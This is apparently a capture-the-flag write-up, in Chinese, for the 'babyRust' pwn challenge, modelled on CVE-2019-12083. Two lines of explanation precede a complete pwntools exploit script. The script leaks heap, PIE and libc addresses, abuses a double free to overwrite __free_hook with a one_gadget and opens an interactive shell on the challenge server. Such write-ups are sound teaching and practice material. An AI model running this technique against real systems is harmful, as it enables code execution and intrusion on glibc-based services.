[中文](./README_zh.md) [English](./README.md)

# babyRust wp

babyRust 源码：https://github.com/zjw88282740/babyRust


出题思路来源[CVE-2019-12083](https://www.cvedetails.com/cve/CVE-2019-12083/ "CVE-2019-12083 security vulnerability details")

逆向有点恶心
任意读十分简单，通过读got表得到libc基址，观察可发现存在double free的情况，直接写__free_hook
```
from pwn import *
libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#p=process("./babyRust")
context.log_level="debug"
p=remote("207.148.126.75",60001)
def show():
    p.recvuntil("4.exit\n")
    p.sendline("2")

def edit(name,x,y,z,i):
    p.recvuntil("4.exit\n")
    p.sendline("3")
    p.recvuntil("input your name:")
    p.sendline(name)
    p.recvuntil(":")
    p.sendline(str(x))
    p.recvuntil(":")
    p.sendline(str(y))
    p.recvuntil(":")
    p.sendline(str(z))
    p.recvuntil(":")
    p.sendline(str(i))

#gdb.attach(p)

p.recvuntil("4.exit\n")
p.sendline("1312") #Boom->S
show()
heap_addr=int(p.recvuntil(", ",drop=True)[2:])-0xa40
print hex(heap_addr)

p.sendline("1313")
p.sendline("1314")

edit("aaa",heap_addr+0x2ce0,0,0,0)
show()
p.sendline("1312")
#show()
print p.recv()

p.sendline("1313")


edit("bbb ",heap_addr+0xb18,8,8,heap_addr+0xb18)
show()
p.recvuntil("3,3,")
pie_addr=u64(p.recv(8))-239480

print hex(pie_addr)

edit("bbb ",pie_addr+0x3be78,8,8,0)
show()
p.recvuntil("3,3,")

libc_addr=u64(p.recv(8))-1161904
print hex(libc_addr)
edit("bbbbb",heap_addr+0x2d40,2,3,4)
p.sendline("1314")
p.recvuntil("4.exit\n")
p.sendline("1")
p.recvuntil("input your name:")
p.sendline("z")

p.recvuntil(":")
p.sendline(str(0))
p.recvuntil(":")
p.sendline(str(4015))
p.recvuntil(":")
p.sendline(str(5))
p.recvuntil(":")
p.sendline(str(0))
show()
free_hook=libc_addr+libc.symbols['__free_hook']-0x28-8
p.sendline("1312")
edit("\x00"*0x20,free_hook,0,0,0)
one_gadget=libc_addr+0x4f322
p.sendline("1313")
edit("\x00"*0x30,free_hook,2,3,one_gadget)
p.sendline("1314")
p.interactive()

```